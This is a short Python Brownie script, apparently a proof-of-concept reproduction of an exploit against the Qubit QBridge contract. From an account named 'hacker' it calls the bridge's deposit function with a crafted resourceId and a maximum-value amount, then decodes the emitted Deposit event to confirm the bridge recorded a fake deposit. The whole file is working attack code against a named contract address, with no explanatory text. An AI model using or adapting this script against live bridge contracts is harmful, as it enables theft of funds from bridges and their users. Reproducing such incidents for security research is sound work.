from brownie import accounts, interface, web3, network

qbridge_eth_proxy = '0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6'

def main():
    hacker = accounts[0]
    qbridge_eth = interface.IQbridge(qbridge_eth_proxy)
    option = 105
    data = web3.codec.encode_abi(["uint256", "uint256"], [option, (1<<256)-1])
    resourceId =  web3.toBytes(hexstr='0x00000000000000000000002f422fe9ea622049d6f73f81a906b9b8cff03b7f01')
    tx = qbridge_eth.deposit(1, resourceId, data, {'from': hacker})
    deposit_topic = '0x9685971ce323aadcdbcd895683b8947d4454b020a263e7fa49aefb0fd0c9317d'
    print('event Deposit(uint8 destinationDomainID, bytes32 resourceID, uint64 depositNonce, address indexed user, bytes data)')
    print('Is tx log deposit topic ? ', web3.toHex(tx.logs[0].topics[0]) == deposit_topic)
    print(f'hacker is: {hacker.address}, log\'s toaddr is: {web3.toHex(tx.logs[0].topics[1])}')
    decode_data = web3.codec.decode_abi(["uint256", "bytes32", "uint64", "bytes"], web3.toBytes(hexstr=tx.logs[0].data))
    print(f'decode data: \ndestinationDomainID={decode_data[0]}; \nresourceID={web3.toHex(decode_data[1])}; \ndepositNonce={decode_data[2]}')
    decode_data_data = web3.codec.decode_abi(["uint256", "uint256"], decode_data[3])
    print(f'option={decode_data_data[0]}; amount={decode_data_data[1]}')
    # For macbook
    network.disconnect()